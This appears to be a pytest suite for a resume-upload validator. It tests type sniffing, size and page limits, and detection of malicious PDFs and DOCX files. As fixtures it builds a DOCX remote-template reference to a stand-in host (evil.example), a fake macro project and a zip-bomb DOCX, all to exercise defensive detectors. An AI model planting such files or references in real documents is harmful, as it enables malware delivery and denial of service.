from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pymupdf
import pytest

from app.core.config import Settings
from app.domain.enums import ResumeStatus
from app.services.validation import inspect_file, sniff_kind, validate_upload


@pytest.fixture(scope="module")
def settings() -> Settings:
    return Settings()


def _pdf(pages: int = 1, open_action: str | None = None) -> bytes:
    doc = pymupdf.open()
    for i in range(pages):
        page = doc.new_page()
        page.insert_text((72, 72), f"Page {i + 1} of a perfectly normal resume")
    if open_action:
        doc.xref_set_key(doc.pdf_catalog(), "OpenAction", open_action)
    return doc.tobytes()


def test_magic_bytes_not_extension(fixtures_dir: Path, settings: Settings) -> None:
    pdf = (fixtures_dir / "clean.pdf").read_bytes()
    docx = (fixtures_dir / "clean.docx").read_bytes()
    assert sniff_kind(pdf) == "pdf"
    assert sniff_kind(docx) == "docx"
    renamed = validate_upload(pdf, "resume.docx", settings)  # extension lies, content wins
    assert renamed.ok and renamed.kind == "pdf"
    fake = validate_upload(b"just some text pretending to be a pdf", "resume.pdf", settings)
    assert not fake.ok and fake.error_code == "UNSUPPORTED_TYPE"
    plain_zip = io.BytesIO()
    with zipfile.ZipFile(plain_zip, "w") as zf:
        zf.writestr("notes.txt", "hello")
    assert validate_upload(plain_zip.getvalue(), "x.docx", settings).error_code == "UNSUPPORTED_TYPE"


def test_empty_and_oversized(settings: Settings) -> None:
    assert validate_upload(b"", "a.pdf", settings).error_code == "EMPTY_FILE"
    small = settings.model_copy(update={"upload": settings.upload.model_copy(update={"max_file_mb": 0.0001})})
    res = validate_upload(_pdf(), "a.pdf", small)
    assert res.error_code == "FILE_TOO_LARGE" and res.status == ResumeStatus.FAILED


def test_page_limit(settings: Settings) -> None:
    res = inspect_file(_pdf(pages=11), "long.pdf", settings)
    assert not res.ok and res.error_code == "TOO_MANY_PAGES" and res.page_count == 11


def test_encrypted_pdf_is_unparseable(fixtures_dir: Path, settings: Settings) -> None:
    res = inspect_file((fixtures_dir / "encrypted.pdf").read_bytes(), "encrypted.pdf", settings)
    assert not res.ok
    assert res.error_code == "ENCRYPTED_FILE"
    assert res.status == ResumeStatus.UNPARSEABLE
    assert res.security.needs_password


def test_javascript_open_action_detected(fixtures_dir: Path, settings: Settings) -> None:
    res = inspect_file((fixtures_dir / "javascript.pdf").read_bytes(), "javascript.pdf", settings)
    assert res.ok
    assert res.security.javascript
    assert res.security.open_action == "JavaScript"
    assert res.security.malicious_pdf


@pytest.mark.parametrize("action", ["[3 0 R /Fit]", "<< /S /GoTo /D [3 0 R /XYZ 0 792 0] >>"])
def test_benign_open_action_is_not_suspicious(action: str, settings: Settings) -> None:
    """Many legit PDFs open on a page/zoom via /OpenAction — that must not be flagged."""
    res = inspect_file(_pdf(open_action=action), "ok.pdf", settings)
    assert res.ok
    assert res.security.open_action is None
    assert not res.security.malicious_pdf


def test_clean_files_have_no_security_findings(fixtures_dir: Path, settings: Settings) -> None:
    for name in ("clean.pdf", "dark_sidebar_legit.pdf", "clean.docx"):
        res = inspect_file((fixtures_dir / name).read_bytes(), name, settings)
        assert res.ok, name
        sec = res.security
        assert not (sec.malicious_pdf or sec.macros or sec.external_template or sec.zip_bomb), name


def _docx_with(fixtures_dir: Path, extra: dict[str, bytes], replace: dict[str, bytes] | None = None) -> bytes:
    src = zipfile.ZipFile(fixtures_dir / "clean.docx")
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for item in src.infolist():
            data = (replace or {}).get(item.filename, src.read(item.filename))
            dst.writestr(item, data)
        for name, data in extra.items():
            dst.writestr(name, data)
    return out.getvalue()


def test_docx_macros_detected(fixtures_dir: Path, settings: Settings) -> None:
    data = _docx_with(fixtures_dir, {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0fake-ole"})
    res = inspect_file(data, "macro.docx", settings)
    assert res.ok and res.security.macros


def test_docx_remote_template_detected(fixtures_dir: Path, settings: Settings) -> None:
    rels = (
        b'<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="http://evil.example/template.dotm" TargetMode="External"/></Relationships>'
    )
    res = inspect_file(_docx_with(fixtures_dir, {"word/_rels/settings.xml.rels": rels}), "t.docx", settings)
    assert res.security.external_template == "http://evil.example/template.dotm"


def test_zip_bomb_refused(fixtures_dir: Path, settings: Settings) -> None:
    data = _docx_with(fixtures_dir, {"word/media/padding.bin": b"\0" * (60 * 1024 * 1024)})
    assert len(data) < 5 * 1024 * 1024  # small on disk ...
    res = inspect_file(data, "bomb.docx", settings)
    assert not res.ok and res.error_code == "ZIP_BOMB" and res.security.zip_bomb
